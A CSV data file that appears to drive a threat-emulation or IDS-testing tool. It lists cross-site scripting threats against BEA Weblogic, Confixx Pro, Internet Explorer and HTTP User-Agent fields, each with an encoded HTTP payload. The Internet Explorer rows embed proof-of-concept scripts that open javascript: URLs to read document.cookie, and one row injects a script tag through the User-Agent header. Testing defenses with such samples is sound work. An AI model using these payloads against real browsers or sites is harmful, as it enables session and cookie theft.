XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿BEAWeblogic_XSS.xml,BEA Weblogic XSS,This threat takes advantage of a Cross-Site Scripting attack on BEA's Weblogic Administration Console.  This can be used for stealing cookies and authentication information.  The BEA Administration Console typically listens on port 8001.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿Confixxpro_XSS.xml,Confixx Pro ftplogin login Variable XSS,"Confixx Pro contains a flaw that allows a remote cross site scripting attack. This flaw exists because the application does not validate the ""login"" variable upon submission to the ftplogin/ script. This could allow a user to create a specially crafted URL that would execute arbitrary code in a user's browser. ConfixxPro  is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿InternetExplorerHistoryXSS.xml,Internet Explorer History XSS Attack,This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
InternetExplorerHistoryXSS.xml,Internet Explorer History XSS Attack,This threat causes a XSS event to occur in the history bar of Internet Explorer.  This allows a user to inject arbitrary commands and steal sensitive user data.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 29 Mar 2005 19||3A ||14||3A ||11 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Last-Modified||3A || Tue, 29 Mar 2005 19||3A ||14||3A ||00 GMT||0D 0A ||ETag||3A || ||22 ||47e76-25a-76822e00||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 602||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A 0D 0A ||<p><font size=||22 ||7||22 ||>RefBack-MyPage</font></p>||0D 0A ||<p><font size=||22 ||6||22 ||><font size=||22 ||2||22 ||><b><i>Created by <a href=||22 ||http||3A ||//clik.to/liudieyu||22 ||>LiuDieYu</a> ||0D 0A ||  at <a href=||22 ||http||3A ||//umbrella.mx.tc||22 ||>UMBRELLA.MX.TC</a> </i></b></font></font></p>||0D 0A ||<SCRIPT>||0D 0A ||VtPage=||22 ||http||3A ||//www.google.com/||22 3B 0D 0A 0D 0A ||w=window.open(||22 ||javascript||3A ||alert('JPU||3A || \\n document.cookie = \\n'+document.cookie)\||3B ||window.opener.Ref=history.back||3B 22 ||,||22 ||_search||22 ||)||3B 0D 0A ||alert(||22 ||wait until the JPU is executed.||22 ||)||3B 0D 0A ||alert(||22 ||[winMain].Ref = \n||22 || + Ref)||3B 0D 0A 0D 0A ||w=window.open(VtPage,||22 ||_search||22 ||)||3B 0D 0A ||alert(||22 ||wait for VtPage||22 ||)||3B 0D 0A ||Ref()||3B 0D 0A ||alert(||22 ||MISSION COMPLETED.||22 ||)||3B 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A ||</SCRIPT>"
﻿InternetExplorerSearchXSS.xml,Internet Explorer XSS Injection Through Searchbar,"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
InternetExplorerSearchXSS.xml,Internet Explorer XSS Injection Through Searchbar,"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 29 Mar 2005 18||3A ||51||3A ||35 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Last-Modified||3A || Tue, 29 Mar 2005 18||3A ||51||3A ||13 GMT||0D 0A ||ETag||3A || ||22 ||47e76-1d5-25076a40||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 469||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html><head></head>||0A ||<body><p><font size=||22 ||7||22 ||>WsOpenFileJPU-MyPage</font></p>||0A ||<p><font size=||22 ||6||22 ||><font size=||22 ||2||22 ||><b><i>Created by <a href=||22 ||http||3A ||//clik.to/liudieyu||22 ||>LiuDieYu</a> ||0A ||  at <a href=||22 ||http||3A ||//umbrella.mx.tc/||22 ||>UMBRELLA.MX.TC</a> </i></b></font></font></p>||0A ||<script>||0A ||VtUrl=||22 ||http||3A ||//www.google.com/||22 3B 0A ||window.open(VtUrl,||22 ||_search||22 ||)||3B 0A ||alert(||22 ||wait for VtUrl in Ws||22 ||)||3B 0A ||window.open(||22 ||file||3A ||javascript||3A ||alert('document.cookie = '+document.cookie)||22 ||,||22 ||_search||22 ||)||3B 0A ||</script></body></html>"
﻿InternetExplorerSearchXSS2.xml,Internet Explorer Search Bar Injection,This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
InternetExplorerSearchXSS2.xml,Internet Explorer Search Bar Injection,This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 29 Mar 2005 19||3A ||08||3A ||31 GMT||0D 0A ||Server||3A || Apache/2.0.40 (Red Hat Linux)||0D 0A ||Last-Modified||3A || Tue, 29 Mar 2005 18||3A ||51||3A ||13 GMT||0D 0A ||ETag||3A || ||22 ||47e76-1d5-25076a40||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 469||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html><head></head>||0A ||<body><p><font size=||22 ||7||22 ||>WsOpenFileJPU-MyPage</font></p>||0A ||<p><font size=||22 ||6||22 ||><font size=||22 ||2||22 ||><b><i>Created by <a href=||22 ||http||3A ||//clik.to/liudieyu||22 ||>LiuDieYu</a> ||0A ||  at <a href=||22 ||http||3A ||//umbrella.mx.tc/||22 ||>UMBRELLA.MX.TC</a> </i></b></font></font></p>||0A ||<script>||0A ||VtUrl=||22 ||http||3A ||//www.google.com/||22 3B 0A ||window.open(VtUrl,||22 ||_search||22 ||)||3B 0A ||alert(||22 ||wait for VtUrl in Ws||22 ||)||3B 0A ||window.open(||22 ||file||3A ||javascript||3A ||alert('document.cookie = '+document.cookie)||22 ||,||22 ||_search||22 ||)||3B 0A ||</script></body></html>"
﻿UserAgentXSS.xml,Generic User-Agent XSS Attempt,"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,GET / HTTP/1.0||0A ||Referer||3A || http||3A ||//example.com||0A ||User-Agent||3A || Special brand ||22 ||/><Script>alert(&quot||3B ||1mp3r3ctr0x3rs&quot||3B ||)||3B ||</script>||0A 0A 0A||
UserAgentXSS.xml,Generic User-Agent XSS Attempt,"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
